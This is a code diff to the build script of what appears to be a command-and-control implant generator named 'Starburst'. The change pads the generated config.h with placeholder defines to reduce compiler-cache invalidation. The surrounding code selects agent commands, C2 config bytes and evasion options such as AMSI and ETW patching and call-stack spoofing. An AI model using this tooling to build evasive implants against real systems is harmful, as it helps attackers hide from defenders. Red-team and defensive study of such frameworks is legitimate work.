@@ -1,5 +1,6 @@
 import pathlib
 import os
+import re
 import struct
 import shutil
 import tempfile
@@ -373,16 +374,24 @@ class Starburst(PayloadType):
             config_bytes = self._serialize_config(c2_profile_name, c2_params)
             config_hex = ", ".join(f"0x{b:02x}" for b in config_bytes)
 
-            commands = self.commands.get_commands()
-            cmd_defines = []
-            for cmd in commands:
-                cmd_defines.append(f"#define INCLUDE_CMD_{cmd.upper()}")
-            cmd_defines_str = "\n".join(cmd_defines)
-
             # Stamp config.h
             config_h_path = os.path.join(dst_path, "include", "config.h")
             with open(config_h_path, "r") as f:
                 config_content = f.read()
+
+            # Always emit a line for every possible command so config.h
+            # has a fixed line count — changing selected commands only
+            # invalidates ccache entries for files that check the changed ifdef.
+            selected_cmds = {c.lower() for c in self.commands.get_commands()}
+            all_cmd_macros = re.findall(r'#define (INCLUDE_CMD_\w+)', config_content)
+            cmd_defines = []
+            for macro in all_cmd_macros:
+                name = macro.replace("INCLUDE_CMD_", "").lower()
+                if name in selected_cmds:
+                    cmd_defines.append(f"#define {macro}")
+                else:
+                    cmd_defines.append(f"#define _NOCMD_{name.upper()} 1")
+            cmd_defines_str = "\n".join(cmd_defines)
 
             config_content = config_content.replace("%TRANSPORT_DEFINE%", transport_define)
             config_content = config_content.replace("%CONFIG_BYTES%", config_hex)
@@ -863,6 +872,8 @@ class Starburst(PayloadType):
         return "\n".join(defines)
 
     def _build_evasion_defines(self):
+        # Always emit exactly 6 lines so config.h has a fixed line count,
+        # minimising ccache invalidation when evasion options change.
         defines = []
         try:
             spoof = self.get_parameter("spoof_profile")
@@ -876,6 +887,9 @@ class Starburst(PayloadType):
                 defines.append("#define SPOOF_PROFILE SPOOF_PROFILE_CUSTOM")
             else:
                 defines.append("#define SPOOF_PROFILE SPOOF_PROFILE_THREAD")
+        else:
+            defines.append("#define _SKIP_EVASION_SPOOF 1")
+            defines.append("#define _SKIP_SPOOF_PROFILE 1")
 
         try:
             inject = self.get_parameter("injection_technique")
@@ -909,6 +923,8 @@ class Starburst(PayloadType):
             patch_amsi = True
         if patch_amsi:
             defines.append("#define INCLUDE_EVASION_AMSI")
+        else:
+            defines.append("#define _SKIP_EVASION_AMSI 1")
 
         try:
             patch_etw = self.get_parameter("patch_etw")
@@ -916,6 +932,8 @@ class Starburst(PayloadType):
             patch_etw = True
         if patch_etw:
             defines.append("#define INCLUDE_EVASION_ETW")
+        else:
+            defines.append("#define _SKIP_EVASION_ETW 1")
 
         return "\n".join(defines)
 
